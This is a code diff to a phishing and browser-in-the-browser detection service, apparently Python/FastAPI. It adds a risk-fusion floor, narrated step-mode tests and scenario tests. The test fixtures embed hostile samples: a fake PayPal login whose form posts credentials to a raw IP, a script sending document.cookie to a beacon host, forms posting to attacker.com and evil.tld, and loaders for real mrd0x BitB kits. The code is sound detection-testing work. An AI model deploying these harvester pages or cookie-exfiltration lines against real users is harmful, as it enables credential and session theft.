@@ -52,18 +52,37 @@ except FileNotFoundError:
     print("[C2-fusion] No c2_fusion.pkl — using weighted-sum fusion")
 
 
-def _fuse_score(layer_results: list, weights: dict) -> float:
+def _fuse_score(layer_results: list, weights: dict,
+                t_susp: float = 30, t_phish: float = 60) -> float:
     """Fused risk 0–100. Uses the learned meta-classifier when present and all six
-    layers ran; otherwise a configurable weighted sum over whatever layers ran."""
+    layers ran; otherwise a configurable weighted sum over whatever layers ran.
+
+    Decisive-signal floor: a near-certain BitB DOM (L1 *heuristic* sub-score, not the
+    ML overlay) can never be washed out by the weighted sum — a confirmed
+    browser-in-the-browser kit IS credential phishing on its own."""
     scores = {lr["id"]: float(lr["score"]) for lr in layer_results}
+    risk = 0.0
     if _fusion_model is not None and all(k in scores for k in _FUSION_ORDER):
         try:
             import pandas as pd
             X = pd.DataFrame([[scores[k] for k in _FUSION_ORDER]], columns=_FUSION_ORDER)
-            return float(_fusion_model.predict_proba(X)[0][1]) * 100
+            risk = float(_fusion_model.predict_proba(X)[0][1]) * 100
         except Exception:
-            pass
-    return sum(s * weights.get(lid, 0.0) for lid, s in scores.items()) * 100
+            risk = 0.0
+    if risk == 0.0:
+        risk = sum(s * weights.get(lid, 0.0) for lid, s in scores.items()) * 100
+
+    l1 = scores.get("L1")
+    if l1 is not None:
+        l1_row = next((lr for lr in layer_results if lr["id"] == "L1"), {})
+        # heuristic sub-score when available (ML overlay can FP on out-of-distribution
+        # pages, so the floor keys off the deterministic heuristic signals only)
+        l1_h = float(l1_row.get("heuristic", l1))
+        if l1_h >= 0.9:
+            risk = max(risk, t_phish)   # definitive BitB kit DOM → PHISHING
+        elif l1_h >= 0.7:
+            risk = max(risk, t_susp)    # strong multi-rule hit → at least SUSPICIOUS
+    return risk
 
 # ── C3 — Browser Execution-Aware C2 Beacon Detector ───────────────────────────
 from .c3.context_tagger import c3_tagger
@@ -332,17 +351,24 @@ async def analyze(req: AnalyzeReq):
         if isinstance(res, Exception):
             layer_results.append({"id": lid, "name": lname, "score": 0.0, "detail": f"Error: {res}"})
         else:
-            layer_results.append({"id": lid, "name": lname,
-                                   "score": round(float(res["score"]), 4),
-                                   "detail": res.get("detail", "")})
+            row = {"id": lid, "name": lname,
+                   "score": round(float(res["score"]), 4),
+                   "detail": res.get("detail", "")}
+            # L1's deterministic heuristic sub-score feeds the fusion floor (§ _fuse_score)
+            if lid == "L1" and "heuristic" in res:
+                row["heuristic"] = res["heuristic"]
+            layer_results.append(row)
 
-    risk_score = round(min(100.0, max(0.0, _fuse_score(layer_results, weights))), 1)
     t_phish = settings.get("verdict_phishing", 60)
     t_susp  = settings.get("verdict_suspicious", 30)
+    risk_score = round(min(100.0, max(0.0, _fuse_score(layer_results, weights,
+                                                       t_susp, t_phish))), 1)
     verdict = "PHISHING" if risk_score >= t_phish else "SUSPICIOUS" if risk_score >= t_susp else "SAFE"
 
+    # strip the internal heuristic sub-score from the public payload
+    public_layers = [{k: v for k, v in lr.items() if k != "heuristic"} for lr in layer_results]
     result = {"url": url, "verdict": verdict, "risk_score": risk_score,
-              "layers": layer_results, "timestamp": datetime.now().isoformat()}
+              "layers": public_layers, "timestamp": datetime.now().isoformat()}
     alerts.insert(0, result)
     if len(alerts) > 500:
         alerts.pop()
@@ -742,6 +768,20 @@ setInterval(sendBeacon, 5000);
 </body></html>""",
 }
 
+# Realistic C2 test pages live on disk in test/C2/pages/ (built from the real mrd0x
+# BitB kits + hand-crafted scenario pages — see test/C2/build_pages.py). Load them
+# into _TEST_PAGES so /dev/test-page/<name> can serve them to the live browser.
+_TEST_PAGES_DIR = os.path.join(_REPO_ROOT, "test", "C2", "pages")
+if os.path.isdir(_TEST_PAGES_DIR):
+    for _fname in os.listdir(_TEST_PAGES_DIR):
+        if _fname.endswith(".html"):
+            _key = "c2-" + _fname[:-5].replace("_", "-")
+            try:
+                with open(os.path.join(_TEST_PAGES_DIR, _fname), encoding="utf-8") as _fh:
+                    _TEST_PAGES[_key] = _fh.read()
+            except OSError:
+                pass
+
 @app.get("/dev/test-page/{name}")
 async def serve_test_page(name: str):
     html = _TEST_PAGES.get(name)
@@ -819,55 +859,79 @@ async def _tc_c1_entropy():
     return {"detail": f"clean={clean:.2f} bits, obfuscated={obf:.2f} bits"}
 
 async def _tc_c2_url_phishing():
+    await _step("Layer 2 is the URL classifier. First: a classic phishing URL — 'paypal' bait "
+                "with a hyphen, on free hosting (yolasite.com)…")
     score_data = await check_url("http://paypal-secure-login.yolasite.com/update")
     assert score_data["score"] > 0.0, f"Phishing URL scored 0: {score_data}"
+    await _step(f"The URL model scored it {score_data['score']:.3f} — brand name + hyphen + "
+                f"free host are strong phishing signals")
     return {"detail": f"paypal-secure-login.yolasite.com → score={score_data['score']:.3f}"}
 
 async def _tc_c2_url_benign():
+    await _step("Same URL layer, now on a normal URL (google.com search) — it must stay low "
+                "to avoid false positives…")
     score_data = await check_url("https://www.google.com/search?q=python")
     assert score_data["score"] < 0.8, f"Benign URL scored too high: {score_data['score']}"
+    await _step(f"google.com scored {score_data['score']:.3f} — well below the flagging "
+                f"threshold, no false positive")
     return {"detail": f"google.com → score={score_data['score']:.3f} (below 0.80 threshold)"}
 
 async def _tc_c2_verified_domain():
     """Verified-domain trust gate: a Tranco-listed site is VERIFIED (no false positive),
     while a phishing page on a free-hosting subdomain is NOT trusted."""
+    await _step("The trust gate: 50,000 verified domains (Tranco list) skip heuristic scanning "
+                "entirely. Even if google.com served markup that trips the DOM heuristics…")
     # google.com served with markup that normally trips L1 heuristics.
     noisy_dom = ('<html><body style="position:fixed;user-select:none">'
                  '<div style="z-index:99999"></div></body></html>')
     g = await analyze(AnalyzeReq(url="https://www.google.com/search?q=python", dom=noisy_dom))
     assert g["verdict"] == "VERIFIED", f"google.com expected VERIFIED, got {g['verdict']} ({g['risk_score']})"
     assert g["risk_score"] == 0.0, f"google.com risk should be 0, got {g['risk_score']}"
+    await _step("google.com → VERIFIED with risk 0 despite the noisy markup. But a phishing "
+                "page on a free-hosting subdomain must NOT inherit trust…")
     # Free-host subdomain must bypass verification and be scanned normally.
     y = await analyze(AnalyzeReq(url="http://paypal-login.yolasite.com/x",
                                  dom='<html><body><form action="http://evil.tld/x">'
                                      '<input type=password></form></body></html>'))
     assert y["verdict"] != "VERIFIED", f"yolasite subdomain wrongly VERIFIED ({y['risk_score']})"
+    await _step(f"paypal-login.yolasite.com bypassed the gate and was scanned → "
+                f"{y['verdict']} (risk {y['risk_score']})")
     return {"detail": f"google.com → VERIFIED (risk 0); paypal-login.yolasite.com → {y['verdict']} (risk {y['risk_score']})"}
 
 async def _tc_c2_form_offsite():
+    await _step("Layer 4 watches where forms SEND data. Here a password form on a bank page "
+                "POSTs to attacker.com — credential harvesting…")
     dom = """<html><body><form action="https://attacker.com/steal" method="POST">
     <input type="password" name="pass"/></form></body></html>"""
     res = await check_form("https://legitimate-bank.com/login", dom)
     assert res["score"] > 0.5, f"Off-domain form scored {res['score']}"
+    await _step(f"Off-domain password POST flagged: L4={res['score']:.2f}")
     return {"detail": f"form→attacker.com from legitimate-bank.com → score={res['score']:.2f}"}
 
 async def _tc_c2_form_samedomain():
+    await _step("The flip side: a password form POSTing to its OWN site (mybank.com → /submit) "
+                "is normal behaviour and must score zero…")
     dom = """<html><body><form action="/submit" method="POST">
     <input type="password" name="pass"/></form></body></html>"""
     res = await check_form("https://mybank.com/login", dom)
     assert res["score"] == 0.0, f"Same-domain form scored {res['score']} (expected 0)"
+    await _step("Same-origin form scored 0.00 — everyday logins stay unflagged")
     return {"detail": f"form→/submit from mybank.com → score=0.00 (safe)"}
 
 async def _tc_c2_browser_phish():
     """Navigate Playwright browser to phishing test page and analyze live."""
     test_url = "http://127.0.0.1:8765/dev/test-page/c2-phish"
     phish_html = _TEST_PAGES["c2-phish"]
+    await _step("Opening a synthetic BitB attack page in the live browser — a fake overlay "
+                "window with a fake address bar covering the whole viewport…")
     # Navigate browser to the test page (visual demonstration)
-    if pw_session.is_running():
-        try:
-            await pw_session.navigate(test_url)
-        except Exception:
-            pass
+    await _ensure_browser_running()
+    try:
+        await pw_session.navigate(test_url)
+        await _step("Attack page rendered — the 'browser window' you see is drawn by the "
+                    "page itself. Scoring it with the DOM/URL/form layers…")
+    except Exception:
+        pass
     # Run C2 analysis on the phishing HTML directly
     res = await check_bitb(test_url, phish_html)
     assert res["score"] > 0.3, f"Phishing page scored too low: {res['score']}"
@@ -875,6 +939,8 @@ async def _tc_c2_browser_phish():
     form_res = await check_form(test_url, phish_html)
     rep_res  = await check_reputation(test_url, settings.get("gsb_key", ""))
     combined = round(min(1.0, res["score"] * 0.35 + url_res["score"] * 0.30 + form_res["score"] * 0.20 + rep_res["score"] * 0.15), 3)
+    await _step(f"Layers fired: BitB DOM={res['score']:.2f}, URL={url_res['score']:.2f}, "
+                f"Form={form_res['score']:.2f} → combined {combined:.2f}")
     return {
         "detail": f"BitB={res['score']:.2f} URL={url_res['score']:.2f} Form={form_res['score']:.2f} → combined={combined:.2f}",
         "browser_url": test_url,
@@ -884,17 +950,226 @@ async def _tc_c2_browser_clean():
     """Navigate Playwright browser to clean test page and verify low score."""
     test_url = "http://127.0.0.1:8765/dev/test-page/c2-clean"
     clean_html = _TEST_PAGES["c2-clean"]
-    if pw_session.is_running():
-        try:
-            await pw_session.navigate(test_url)
-        except Exception:
-            pass
+    await _step("Opening a normal blog page in the live browser — the detector must stay "
+                "quiet on everyday pages…")
+    await _ensure_browser_running()
+    try:
+        await pw_session.navigate(test_url)
+        await _step("Blog page rendered — no overlays, no fake chrome. Scoring it…")
+    except Exception:
+        pass
     res = await check_bitb(test_url, clean_html)
     assert res["score"] < 0.8, f"Clean page scored too high: {res['score']}"
+    await _step(f"Clean page scored {res['score']:.2f} — below the flagging threshold, no "
+                f"false positive")
     return {
         "detail": f"Clean blog page → BitB score={res['score']:.2f} (below 0.80 threshold)",
         "browser_url": test_url,
     }
+
+# ── C2 realistic scenario tests ──────────────────────────────────────────────
+# Page assets: test/C2/pages/ (real mrd0x BitB kits via build_pages.py + scenario
+# pages), served to the live browser through /dev/test-page/<name>.
+
+_C2_TESTPAGE_BASE = "http://127.0.0.1:8765/dev/test-page"
+_C2_MS_LOOKALIKE  = "https://login.microsoft.com.evil-phish.xyz/oauth2/v2.0/authorize"
+
+
+def _c2_page(name: str) -> str:
+    key = f"c2-{name}"
+    assert key in _TEST_PAGES, f"test page '{key}' missing — run: python test/C2/build_pages.py"
+    return _TEST_PAGES[key]
+
+
+def _layer(result: dict, lid: str) -> dict:
+    return next((l for l in result.get("layers", []) if l["id"] == lid), {})
+
+
+async def _tc_c2_kit_windows():
+    """Real mrd0x BitB kit (Windows Chrome template) rendered in the live browser,
+    analyzed through the full pipeline as if hosted on a Microsoft lookalike domain."""
+    await _ensure_browser_running()
+    test_url = f"{_C2_TESTPAGE_BASE}/c2-bitb-kit-windows"
+    await _step("Opening the real mrd0x BitB kit (Windows Chrome template) in the live "
+                "browser — the victim landed here via a link, as if it were hosted on "
+                "login.microsoft.com.evil-phish.xyz")
+    await pw_session.navigate(test_url)
+    await _step("Kit rendered. Look at the browser window: the page has drawn a FAKE "
+                "browser window inside itself — the 'address bar' showing "
+                "login.microsoftonline.com is just pixels, not real chrome")
+    dom = await pw_session.get_dom()
+    await _step("Extracting the rendered DOM and running the 6-layer analysis…")
+    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=dom))
+    l1 = _layer(res, "L1")
+    assert l1.get("score", 0) >= 0.75, f"Real BitB kit L1 too low: {l1.get('score')}"
+    assert "fake browser window chrome" in l1.get("detail", ""), \
+        f"window-chrome signature missing: {l1.get('detail')}"
+    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
+    await _step(f"L1 BitB layer scored {l1['score']:.2f} — fake window chrome + draggable "
+                f"window signatures fired. Decisive-signal floor → {res['verdict']} "
+                f"({res['risk_score']}/100)")
+    return {"detail": f"mrd0x Windows kit → L1={l1['score']:.2f} "
+                      f"({l1['detail'].split(' | ')[-1][:60]}) → {res['verdict']} {res['risk_score']}",
+            "browser_url": test_url}
+
+
+async def _tc_c2_kit_macos():
+    """Real mrd0x BitB kit (macOS Chrome template) — same attack, different skin."""
+    await _ensure_browser_running()
+    test_url = f"{_C2_TESTPAGE_BASE}/c2-bitb-kit-macos"
+    await _step("Opening the macOS variant of the same mrd0x kit — same attack, different skin")
+    await pw_session.navigate(test_url)
+    await _step("Rendered — the fake window now mimics macOS Chrome (traffic-light buttons, "
+                "fake URL bar). The DOM signatures are skin-independent")
+    dom = await pw_session.get_dom()
+    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=dom))
+    l1 = _layer(res, "L1")
+    assert l1.get("score", 0) >= 0.75, f"Real BitB kit L1 too low: {l1.get('score')}"
+    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
+    await _step(f"L1={l1['score']:.2f} → {res['verdict']} ({res['risk_score']}/100) — "
+                f"detected regardless of the visual skin")
+    return {"detail": f"mrd0x macOS kit → L1={l1['score']:.2f} → {res['verdict']} {res['risk_score']}",
+            "browser_url": test_url}
+
+
+async def _tc_c2_scenario_oauth():
+    """Scenario: fake Microsoft OAuth popup (mrd0x Windows kit) hosted on a
+    lookalike domain. Static full-pipeline analysis of the real kit markup."""
+    await _step("Scenario: the attacker hosts the same fake-OAuth popup kit on a Microsoft "
+                "lookalike domain (login.microsoft.com.evil-phish.xyz). Running the full "
+                "pipeline on the kit markup…")
+    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=_c2_page("bitb-kit-windows")))
+    l1, l2 = _layer(res, "L1"), _layer(res, "L2")
+    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
+    await _step(f"Both layers fired: L1 (fake window DOM)={l1.get('score', 0):.2f}, "
+                f"L2 (lookalike URL)={l2.get('score', 0):.2f} → {res['verdict']} "
+                f"{res['risk_score']}/100")
+    return {"detail": f"lookalike-domain OAuth popup → L1={l1.get('score', 0):.2f} "
+                      f"L2={l2.get('score', 0):.2f} → {res['verdict']} {res['risk_score']}"}
+
+
+async def _tc_c2_scenario_freehost():
+    """Scenario: PayPal credential harvester on free hosting — off-domain form POST,
+    brand title/favicon, cookie-beacon exfil script. L5 (reputation) is 0 without a
+    GSB key; with one it adds up to 20 pts, pushing this past the PHISHING cutoff."""
+    dom = """<html><head><title>PayPal - Sign In</title>
+    <link rel="icon" href="https://www.paypal.com/favicon.ico"/></head>
+    <body style="margin:0"><div style="max-width:380px;margin:60px auto;padding:24px;border:1px solid #ddd">
+    <h2>Log in to PayPal</h2>
+    <form action="http://198.51.100.44/collect/paypal" method="POST">
+      <input type="email" name="login_email" placeholder="Email"/>
+      <input type="password" name="login_password" placeholder="Password"/>
+      <input type="hidden" name="locale" value="en-US"/>
+      <button type="submit">Log In</button>
+    </form>
+    <script>fetch('http://198.51.100.44/beacon',{method:'POST',body:document.cookie});</script>
+    </div></body></html>"""
+    url = "http://paypal-secure-login.yolasite.com/update"
+    await _step("Scenario: a PayPal credential harvester on free hosting (yolasite). The form "
+                "POSTs the password to a raw IP off-domain and a script beacons the cookies…")
+    res = await analyze(AnalyzeReq(url=url, dom=dom))
+    l4 = _layer(res, "L4")
+    assert l4.get("score", 0) >= 0.5, f"off-domain harvest form L4 too low: {l4.get('score')}"
+    assert res["verdict"] in ("SUSPICIOUS", "PHISHING"), \
+        f"expected SUSPICIOUS+, got {res['verdict']} ({res['risk_score']})"
+    await _step(f"L4 (form destination)={l4['score']:.2f} — password form POSTs off-origin → "
+                f"{res['verdict']} {res['risk_score']}/100")
+    return {"detail": f"free-host harvester → L4={l4['score']:.2f} "
+                      f"(off-domain POST + password field) → {res['verdict']} {res['risk_score']}"}
+
+
+async def _tc_c2_scenario_compromised():
+    """Scenario: BitB kit injected into a compromised legitimate site — the URL is
+    clean, so only the DOM signals can catch it. Previously fused to 5/100 (SAFE);
+    the decisive-signal floor now forces PHISHING."""
+    await _step("Scenario: the hardest case — the BitB kit is injected into a COMPROMISED "
+                "legitimate site (hillside-bakery.com). The URL is perfectly clean, so only "
+                "the DOM can catch it…")
+    res = await analyze(AnalyzeReq(url="https://www.hillside-bakery.com/news",
+                                   dom=_c2_page("bitb-kit-windows")))
+    l1 = _layer(res, "L1")
+    assert res["verdict"] == "PHISHING", \
+        f"kit on clean domain should be PHISHING via floor, got {res['verdict']} ({res['risk_score']})"
+    await _step(f"URL layers score ~0, but L1={l1.get('score', 0):.2f} and the "
+                f"decisive-signal floor forces {res['verdict']} ({res['risk_score']}/100) — "
+                f"this was SAFE before the floor existed")
+    return {"detail": f"clean-URL kit → L1={l1.get('score', 0):.2f} heuristic floor → "
+                      f"{res['verdict']} {res['risk_score']} (was SAFE before the floor)"}
+
+
+async def _tc_c2_runtime_keylogger():
+    """Live runtime-behavior scenario: the page keylogs the password field, hooks the
+    clipboard, blocks drag/selection, and exfiltrates credentials off-origin. The L6
+    signals are collected non-invasively (CDP + network observer) after the active
+    probe trips the keylogger, then the block interstitial is verified on the page."""
+    await _ensure_browser_running()
+    test_url = f"{_C2_TESTPAGE_BASE}/c2-keylogger-harvest"
+    await _step("Opening a fake Microsoft login page that looks completely normal — but its "
+                "scripts attach a keylogger to the password field and hook the clipboard")
+    await pw_session.navigate(test_url)
+    await asyncio.sleep(0.6)  # let page scripts attach listeners
+    await _step("Page rendered. Now typing synthetic keystrokes into the password field "
+                "(the active probe) — a real user's keystrokes would be captured the same way")
+    # First call trips the keylogger with synthetic keys (the probe's POST is only
+    # observed by the network listener after it runs), second call picks it up.
+    await pw_session.get_runtime_signals(active_probe=True)
+    await asyncio.sleep(0.8)
+    signals = await pw_session.get_runtime_signals()
+    l6 = await check_runtime(test_url, signals)
+    await _step(f"The keylogger fired and POSTed the captured keys off-origin to "
+                f"{', '.join(signals.get('exfil_hosts', [])) or '?'} — caught by the "
+                f"non-invasive network observer + CDP listener scan. L6 runtime layer: "
+                f"{l6['score']:.2f}")
+    assert l6["score"] >= 0.4, f"keylogger page L6 too low: {l6['score']} ({signals})"
+    assert signals.get("exfil_hosts"), f"off-origin exfil POST not observed: {signals}"
+    assert signals.get("kb_on_password"), f"password keylogger not detected: {signals}"
+
+    dom = await pw_session.get_dom()
+    res = await analyze(AnalyzeReq(url=test_url, dom=dom, runtime=signals))
+    assert res["risk_score"] >= settings.get("verdict_suspicious", 30), \
+        f"expected at least SUSPICIOUS, got {res['verdict']} ({res['risk_score']})"
+
+    await pw_session.inject_interstitial("block", res)
+    page = pw_session._page
+    overlay = await page.evaluate("!!document.getElementById('__ws_overlay')")
+    assert overlay, "block interstitial overlay did not appear on the live page"
+    await _step(f"Fused verdict: {res['verdict']} ({res['risk_score']}/100). The BLOCK "
+                f"interstitial is on the live page right now — this is what a real user "
+                f"sees before any credentials reach the attacker")
+    await page.evaluate("document.getElementById('__ws_continue').click()")
+    await asyncio.sleep(0.2)
+    gone = await page.evaluate("!document.getElementById('__ws_overlay')")
+    assert gone, "'Continue anyway' did not dismiss the overlay"
+    await _step("Overlay dismissed via 'Continue anyway' (user choice is preserved, but the "
+                "warning was impossible to miss)")
+    return {"detail": f"keylogger+exfil → L6={l6['score']:.2f} "
+                      f"({', '.join(signals.get('exfil_hosts', [])) or 'no exfil'} observed) → "
+                      f"{res['verdict']} {res['risk_score']} · block overlay shown & dismissed",
+            "browser_url": test_url}
+
+
+async def _tc_c2_benign_login():
+    """Realistic legitimate bank login — fixed header, high-z-index cookie modal,
+    same-origin password form, security-tips text mentioning the address bar.
+    Carries every FP trap L1 heuristics look for; fused verdict must stay SAFE."""
+    await _ensure_browser_running()
+    test_url = f"{_C2_TESTPAGE_BASE}/c2-benign-login"
+    await _step("Opening a REALISTIC legitimate bank login — it has every false-positive trap: "
+                "fixed header, a full-screen cookie modal, user-select:none, security tips "
+                "mentioning the address bar, and a same-origin password form")
+    await pw_session.navigate(test_url)
+    dom = await pw_session.get_dom()
+    await _step("Page rendered. Running the same 6-layer analysis that flagged the attacks…")
+    res = await analyze(AnalyzeReq(url="https://www.acmebank.com/auth/login", dom=dom))
+    l4 = _layer(res, "L4")
+    assert l4.get("score", 1) == 0.0, f"same-origin login form wrongly flagged: {l4.get('score')}"
+    assert res["verdict"] == "SAFE", f"legit login page not SAFE: {res['verdict']} ({res['risk_score']})"
+    await _step(f"Verdict: {res['verdict']} ({res['risk_score']}/100) — no false positive. "
+                f"The detector distinguishes a real login page from an attack")
+    return {"detail": f"realistic bank login (fixed nav + modal + same-origin form) → "
+                      f"{res['verdict']} {res['risk_score']}, L4={l4.get('score', 0):.2f}",
+            "browser_url": test_url}
+
 
 async def _tc_c3_beacon_iat():
     from .c3.feature_engine import compute_features
@@ -1632,6 +1907,30 @@ async def _tc_c4_coverage():
                       f"(excluded: {', '.join(coverage['excluded'])})"}
 
 
+# ── Step-mode (demo pacing) ───────────────────────────────────────────────────
+# When the Tests panel runs with ?step=1, test functions narrate via _step() and
+# pause until the user presses "Next step" (POST /dev/test_step releases the gate).
+_STEP_CTX = None  # {"queue": asyncio.Queue, "gate": asyncio.Event, "id": str}
+
+
+async def _step(msg: str):
+    """Step mode only: emit a narration event to the test stream, then wait for
+    the user's Next click. No-op during normal (fast) runs."""
+    ctx = _STEP_CTX
+    if ctx is None:
+        return
+    ctx["gate"].clear()
+    await ctx["queue"].put({"type": "step", "id": ctx["id"], "msg": msg})
+    await ctx["gate"].wait()
+
+
+@app.post("/dev/test_step")
+async def dev_test_step():
+    if _STEP_CTX is not None:
+        _STEP_CTX["gate"].set()
+    return {"ok": True, "waiting": _STEP_CTX is not None}
+
+
 _ALL_TEST_CASES = [
     {"id":"c1_benign",    "component":"c1","label":"Benign manifest → no risk flags",         "fn":_tc_c1_benign_manifest},
     {"id":"c1_malicious", "component":"c1","label":"Malicious manifest → 4 high-risk flags",  "fn":_tc_c1_malicious_manifest},
@@ -1644,6 +1943,13 @@ _ALL_TEST_CASES = [
     {"id":"c2_form_same", "component":"c2","label":"Form: same-domain POST → score = 0",      "fn":_tc_c2_form_samedomain},
     {"id":"c2_browser_phish","component":"c2","label":"[Browser] BitB phishing page → detected live","fn":_tc_c2_browser_phish,"browser":True},
     {"id":"c2_browser_clean","component":"c2","label":"[Browser] Clean page → low score",     "fn":_tc_c2_browser_clean,"browser":True},
+    {"id":"c2_kit_windows","component":"c2","label":"[Browser] Real mrd0x BitB kit (Windows) rendered live → PHISHING","fn":_tc_c2_kit_windows,"browser":True},
+    {"id":"c2_kit_macos","component":"c2","label":"[Browser] Real mrd0x BitB kit (macOS) rendered live → PHISHING","fn":_tc_c2_kit_macos,"browser":True},
+    {"id":"c2_scenario_oauth","component":"c2","label":"Scenario: fake Microsoft OAuth popup on lookalike domain → PHISHING","fn":_tc_c2_scenario_oauth},
+    {"id":"c2_scenario_freehost","component":"c2","label":"Scenario: PayPal credential harvester on free hosting → flagged","fn":_tc_c2_scenario_freehost},
+    {"id":"c2_scenario_compromised","component":"c2","label":"Scenario: BitB kit on a compromised legit domain (clean URL) → PHISHING","fn":_tc_c2_scenario_compromised},
+    {"id":"c2_runtime_keylogger","component":"c2","label":"[Browser] Keylogger + off-origin credential exfil → L6 fires, block overlay shown","fn":_tc_c2_runtime_keylogger,"browser":True},
+    {"id":"c2_benign_login","component":"c2","label":"[Browser] Realistic legitimate bank login → stays SAFE (no false positive)","fn":_tc_c2_benign_login,"browser":True},
     {"id":"c3_beacon_iat","component":"c3","label":"Beacon events: IAT-CV < 0.10 (clockwork timing)","fn":_tc_c3_beacon_iat},
     {"id":"c3_human_iat", "component":"c3","label":"Human browsing: IAT-CV > 0.10 (irregular)","fn":_tc_c3_human_iat},
     {"id":"c3_fusion_beacon","component":"c3","label":"Risk fusion: BEACON verdict at high signals","fn":_tc_c3_fusion_beacon},
@@ -1676,21 +1982,43 @@ _ALL_TEST_CASES = [
 
 
 @app.get("/dev/run_tests_stream")
-async def run_tests_stream_endpoint(component: str = "all"):
-    """SSE stream: runs test cases one by one and emits results."""
+async def run_tests_stream_endpoint(component: str = "all", step: bool = False):
+    """SSE stream: runs test cases one by one and emits results. With step=1,
+    cases narrate via _step() and pause until POST /dev/test_step."""
     cases = [tc for tc in _ALL_TEST_CASES
              if component == "all" or tc["component"] == component]
 
     async def generate():
+        global _STEP_CTX
         total = len(cases)
-        yield f"data: {json.dumps({'type':'init','total':total})}\n\n"
+        yield f"data: {json.dumps({'type':'init','total':total,'step':step})}\n\n"
         passed = 0
         failed = 0
         for i, tc in enumerate(cases):
             yield f"data: {json.dumps({'type':'start','index':i,'id':tc['id'],'label':tc['label'],'component':tc['component'],'browser':tc.get('browser',False)})}\n\n"
             start = _time.time()
             try:
-                result = await tc["fn"]()
+                if step:
+                    queue, gate = asyncio.Queue(), asyncio.Event()
+                    _STEP_CTX = {"queue": queue, "gate": gate, "id": tc["id"]}
+                    task = asyncio.create_task(tc["fn"]())
+                    try:
+                        while True:
+                            getter = asyncio.ensure_future(queue.get())
+                            done, _ = await asyncio.wait(
+                                {task, getter}, return_when=asyncio.FIRST_COMPLETED)
+                            if getter in done:
+                                yield f"data: {json.dumps(getter.result())}\n\n"
+                            else:
+                                getter.cancel()
+                                result = task.result()  # re-raises fn exceptions
+                                break
+                    finally:
+                        _STEP_CTX = None
+                        if not task.done():
+                            task.cancel()
+                else:
+                    result = await tc["fn"]()
                 elapsed = round(_time.time() - start, 2)
                 passed += 1
                 yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'pass','elapsed':elapsed,'detail':result.get('detail',''),'browser_url':result.get('browser_url','')})}\n\n"
